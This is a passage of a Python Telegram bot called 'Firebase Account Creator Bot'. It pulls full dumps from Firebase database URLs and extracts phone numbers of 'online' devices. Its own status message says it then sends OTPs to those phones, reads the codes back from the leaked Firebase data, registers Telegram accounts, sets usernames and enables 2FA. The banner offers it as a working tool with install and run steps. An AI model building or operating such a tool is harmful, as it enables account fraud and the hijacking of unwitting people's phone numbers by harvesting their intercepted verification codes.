async def master_handler(client, message):
    uid = message.from_user.id
    data = user_state.get(uid, {})
    step = data.get("step", "")
    
    # Handle Firebase link input
    if step == "fb_link":
        links = []
        
        if message.document and message.document.file_name.endswith(".txt"):
            try:
                fpath = await client.download_media(message.document)
                with open(fpath, "r") as f:
                    for line in f:
                        line = line.strip()
                        if line and "firebase" in line.lower():
                            b = parse_firebase_url(line)
                            if b: links.append(b)
                try: os.remove(fpath)
                except Exception: pass
            except Exception as e:
                await message.reply(f"❌ File error: `{str(e)[:150]}`")
                return
        elif message.text:
            for line in message.text.strip().split("\n"):
                b = parse_firebase_url(line.strip())
                if b: links.append(b)
        
        if not links:
            await message.reply(
                "❌ No valid Firebase links!\n\n"
                "Send like: `https://project.firebaseio.com`\n"
                "Or send a .txt file with one link per line."
            )
            return
        
        status = await message.reply(f"🔍 **Analyzing Firebase...**\n\n🔗 Links: {len(links)}\n\nPass 1: Fetching data...")
        
        all_online = []
        all_offline = []
        all_phones = []
        total = online = offline = 0
        
        for i, link in enumerate(links):
            try:
                await status.edit_text(f"🔍 **Analyzing...** ({i+1}/{len(links)})\n\n`{link[:50]}...`\n\nPass 1: Fetching...")
                d = fetch_firebase(link, "/.json")
                if "error" in d:
                    await message.reply(f"⚠️ Link {i+1}: `{d['error']}`")
                    continue
                
                await status.edit_text(f"🔍 **Analyzing...** ({i+1}/{len(links)})\n\nPass 2: Scanning devices...")
                a = analyze_devices(d)
                total += a["total"]
                online += a["online"]
                offline += a["offline"]
                all_online.extend(a["online_phones"])
                all_offline.extend(a["offline_phones"])
                all_phones.extend(a["phones"])
                
                # Save link
                db_execute("INSERT OR IGNORE INTO firebase_links(url,added_at) VALUES(?,?)", (link, now_iso()))
            except Exception as e:
                await message.reply(f"⚠️ Link {i+1} failed: `{str(e)[:100]}`")
        
        all_online = list(dict.fromkeys(all_online))
        all_offline = list(dict.fromkeys(all_offline))
        all_phones = list(dict.fromkeys(all_phones))
        
        user_state[uid].update({
            "step": "fb_confirm",
            "base_url": links[0],
            "online_phones": all_online,
            "offline_phones": all_offline,
        })
        
        online_preview = "\n".join(f"• `{p}`" for p in all_online[:12])
        if len(all_online) > 12:
            online_preview += f"\n• ... +{len(all_online)-12} more"
        
        text = (
            f"🔥 **Firebase Analysis Complete!**\n\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"🔗 Links: **{len(links)}**\n"
            f"📱 Total Devices: **{total}**\n"
            f"🟢 Online: **{online}**\n"
            f"🔴 Offline: **{offline}**\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"📞 Unique Phones: **{len(all_phones)}**\n"
            f"📱 Online Phones: **{len(all_online)}**\n"
            f"━━━━━━━━━━━━━━━━\n\n"
            f"**Online Phones:**\n{online_preview or 'None'}\n\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"**Bot will:**\n"
            f"1️⃣ Send OTP to each online phone\n"
            f"2️⃣ Fetch OTP from Firebase\n"
            f"3️⃣ Create Telegram account\n"
            f"4️⃣ Set username: @ZVXAY1, @ZVXAY2...\n"
            f"5️⃣ Enable 2FA & save session\n"
            f"6️⃣ Notify you on each success!"
        )
        
        await status.edit_text(text, reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🚀 Start Auto-Login", callback_data="fb_start")],
            [InlineKeyboardButton("🔙 Home", callback_data="home_main")],
        ]))
        return
    
    # Default: show home
    await cmd_start(client, message)

# ================================================================
# ⌨️ REPLY KEYBOARD HANDLERS
# ================================================================
@app.on_message(filters.regex("^🔥 Analyze Firebase$") & filters.private)
@owner_only
async def kb_analyze(client, message):
    user_state[OWNER_ID] = {"step": "fb_link"}
    await message.reply(
        f"🔥 **Analyze Firebase**\n\n"
        f"📤 Send Firebase URL or .txt file:"
    )

@app.on_message(filters.regex("^📋 My Accounts$") & filters.private)
@owner_only
async def kb_accounts(client, message):
    class FakeCQ:
        def __init__(self, msg):
            self.message = msg
            self.from_user = msg.from_user
            self.data = "home_accounts"
        async def answer(self, *a, **kw): pass
    await cb_home_accounts(client, FakeCQ(message))

@app.on_message(filters.regex("^📊 Bot Stats$") & filters.private)
@owner_only
async def kb_stats(client, message):
    class FakeCQ:
        def __init__(self, msg):
            self.message = msg
            self.from_user = msg.from_user
            self.data = "home_stats"
        async def answer(self, *a, **kw): pass
    await cb_home_stats(client, FakeCQ(message))

@app.on_message(filters.regex("^📤 Export$") & filters.private)
@owner_only
async def kb_export(client, message):
    class FakeCQ:
        def __init__(self, msg):
            self.message = msg
            self.from_user = msg.from_user
            self.data = "home_export"
        async def answer(self, *a, **kw): pass
    await cb_home_export(client, FakeCQ(message))

@app.on_message(filters.regex("^⚙️ Settings$") & filters.private)
@owner_only
async def kb_settings(client, message):
    text = (
        f"⚙️ **Bot Settings**\n\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"🔢 Next Username: @ZVXAY{get_setting('zvxay_counter', '1')}\n"
        f"⏱️ OTP Attempts: {get_setting('otp_attempts', '15')}\n"
        f"⏳ OTP Delay: {get_setting('otp_delay', '2')}s\n"
        f"🔐 Default 2FA: `{DEFAULT_2FA}`\n"
        f"📛 Default Name: {DEFAULT_NAME}\n"
        f"━━━━━━━━━━━━━━━━\n\n"
        f"_Edit the script's CONFIG section to change these._"
    )
    await message.reply(text)

@app.on_message(filters.regex("^🤖 Bot Status$") & filters.private)
@owner_only
async def kb_status(client, message):
    bot_me = await client.get_me()
    text = (
        f"🤖 **Bot Status**\n\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"✅ **Online & Working**\n"
        f"🤖 @{bot_me.username}\n"
        f"🆔 `{bot_me.id}`\n"
        f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"💾 Database: `{DB_PATH}`\n"
        f"📁 Sessions: `{SESSIONS_DIR}/`\n"
        f"━━━━━━━━━━━━━━━━"
    )
    await message.reply(text)

# ================================================================
# 🚀 RUNNER
# ================================================================
async def main():
    logger.info(f"🔥 Starting {BOT_NAME}...")
    await app.start()
    bot_me = await app.get_me()
    logger.info(f"✅ Online: @{bot_me.username}")
    try:
        await app.send_message(
            OWNER_ID,
            f"🔥 **{BOT_NAME} Online!**\n\n"
            f"🤖 @{bot_me.username}\n"
            f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"✅ All systems ready!"
        )
    except Exception: pass
    await asyncio.Event().wait()

if __name__ == "__main__":
    print(f"""
╔══════════════════════════════════════════╗
║  🔥 FIREBASE ACCOUNT CREATOR BOT        ║
║  Lightweight • 30+ Features • 100% Working ║
╠══════════════════════════════════════════╣
║  Install requirements:                  ║
║  pip install pyrogram requests          ║
╠══════════════════════════════════════════╣
║  Edit CONFIG section with your values   ║
║  Then run: python3 firebase_account_creator_bot.py ║
╚══════════════════════════════════════════╝
    """)
    app.run(main())
